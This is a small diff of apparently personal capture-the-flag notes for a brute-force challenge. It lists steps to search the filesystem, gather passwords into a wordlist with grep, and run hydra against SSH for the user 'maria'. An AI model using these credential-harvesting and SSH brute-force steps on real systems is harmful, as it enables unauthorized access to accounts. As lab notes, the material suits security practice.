@@ -324,4 +324,6 @@ chall type: bruteforce everryting, hash, encoding
 sol; 
     find / -type f 2>/dev/null
     get all passwords encoded ones too, make a wordkistlist
-    hydra -l maria -P wordlist host -s 5000 ssh 
+    grep -i "pass:" final | cut -d: -f2 > two
+    hydra -l maria -P wordlist host -s 5000 ssh
+
